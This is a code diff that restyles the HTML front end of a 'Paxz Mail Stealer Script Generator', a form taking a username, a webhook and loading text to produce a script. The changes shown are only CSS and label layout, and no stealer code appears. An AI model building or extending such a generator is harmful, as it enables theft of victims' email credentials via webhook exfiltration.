@@ -5,19 +5,43 @@
     <title>Paxz Mail Stealer Script Generator</title>
     <style>
       body {
-        background-image: url('https://4kwallpapers.com/images/wallpapers/galaxy-milky-way-stars-deep-space-colorful-astronomy-nebula-2880x1800-5366.jpg');
+        background-image: url("https://4kwallpapers.com/images/wallpapers/galaxy-milky-way-stars-deep-space-colorful-astronomy-nebula-2880x1800-5366.jpg");
         background-size: cover;
+        background-repeat: no-repeat;
+      }
+      
+      label {
+        color: black;
+        display: block;
+        font-weight: bold;
+        margin-top: 10px;
+      }
+      
+      input[type="text"], textarea {
+        border: 1px solid white;
+        border-radius: 5px;
+        color: black;
+        padding: 5px;
+      }
+      
+      input[type="button"] {
+        margin-top: 10px;
+        padding: 5px;
+      }
+      
+      #output {
+        margin-top: 10px;
       }
     </style>
   </head>
   <body>
     <h1>Paxz Mail Stealer Script Generator</h1>
     <form>
-      <label for="username">Username:</label><br>
+      <label for="username">Username:</label>
       <input type="text" id="username" name="username"><br>
-      <label for="webhook">Webhook:</label><br>
+      <label for="webhook">Webhook:</label>
       <input type="text" id="webhook" name="webhook"><br>
-      <label for="loadingText">LoadingText:</label><br>
+      <label for="loadingText">LoadingText:</label>
       <input type="text" id="loadingText" name="loadingText"><br>
       <label for="output">Script Output:</label><br>
       <textarea id="output" rows="10" cols="50"></textarea><br>
